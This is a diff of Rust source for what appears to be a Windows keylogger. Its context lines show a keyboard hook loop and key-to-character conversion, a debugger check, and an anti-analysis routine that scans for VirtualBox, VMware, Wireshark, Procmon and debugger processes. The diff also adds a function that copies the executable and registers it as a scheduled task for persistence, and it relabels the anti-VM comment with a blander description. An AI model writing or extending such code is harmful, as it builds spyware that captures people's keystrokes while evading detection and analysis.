@@ -121,12 +121,12 @@ pub unsafe fn set_windows_hook(){
 
             // This keeps the thread alive to receive hook messages
         while GetMessageW(&mut msg, Some(HWND(std::ptr::null_mut())), 0, 0).as_bool() {
-            TranslateMessage(&msg);
+             let _ = TranslateMessage(&msg);
             DispatchMessageW(&msg);
         }
 
 
-        UnhookWindowsHookEx(hook);
+        let _ = UnhookWindowsHookEx(hook);
     }
 }
 
@@ -169,7 +169,7 @@ unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{
         
         let mut keyboard_state = [0u8;256];
 
-        GetKeyboardState(&mut keyboard_state);
+         let _ = GetKeyboardState(&mut keyboard_state);
 
             // Simulate Caps Lock toggle
         let caps = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001;
@@ -187,7 +187,7 @@ unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{
 
         let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);
 
-        let result = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
+        let _ = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
         
         
         char::from_u32(char_buf[0] as u32)
@@ -260,7 +260,7 @@ pub fn check_for_debugging(){
     };
 }
 
-//anti VM
+//function that takes a snap shot of the running process
 pub fn check_for_process(){
 
     let warry_process = vec!["vboxservice.exe", "vmtoolsd.exe","wireshark.exe", "procmon.exe", "ollydbg.exe","x64dbg.exe"];
@@ -304,6 +304,7 @@ pub fn check_for_process(){
     }
 }
 
+//helper function
 fn ansi_to_string(bytes: &[i8]) -> String {
     let nul_pos = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
     let u8_slice = &bytes[..nul_pos];
@@ -311,13 +312,7 @@ fn ansi_to_string(bytes: &[i8]) -> String {
     String::from_utf8_lossy(&u8_slice).to_string()
 }
 
-pub fn add_sheduled_task(){
-    
-    let task_path = std::env::current_exe().expect("Can't find");
-
-
-}
-
+//moves files and sets it as a sheduling task
 pub fn mv_file(){
 
     let curr_file = std::env::current_exe().expect("Can't find");
